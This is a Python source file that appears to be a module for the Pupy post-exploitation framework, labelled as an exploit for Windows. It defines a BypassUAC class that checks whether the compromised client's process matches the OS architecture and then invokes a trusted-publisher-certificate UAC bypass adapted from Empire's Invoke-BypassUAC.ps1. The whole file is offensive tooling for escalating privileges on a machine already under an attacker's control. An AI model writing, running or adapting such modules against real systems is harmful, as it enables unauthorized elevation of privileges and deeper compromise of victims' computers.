# -*- coding: UTF8 -*-

import os
from pupylib.PupyModule import *
from rpyc.utils.classic import upload
from modules.lib.windows.bypassuac import bypassuac_through_trusted_publisher_certificate
__class_name__="BypassUAC"

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

@config(compat="windows", category="exploit")
class BypassUAC(PupyModule):
    """ try to bypass UAC with Invoke-BypassUAC.ps1, from Empire """
    dependencies=["psutil", "pupwinutils.processes"]
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)

    def run(self, args):
		if self.client.desc['proc_arch'] == '32bit' and self.client.conn.modules['pupwinutils.processes'].is_x64_architecture():
			self.error("You are using a x86 process while the os architecture is x64")
			self.error("Migrate to a x64 process before trying to bypass UAC")
		else:
			self.success("Trying to bypass UAC...")
			bypassuac_through_trusted_publisher_certificate(self, rootPupyPath=ROOT)
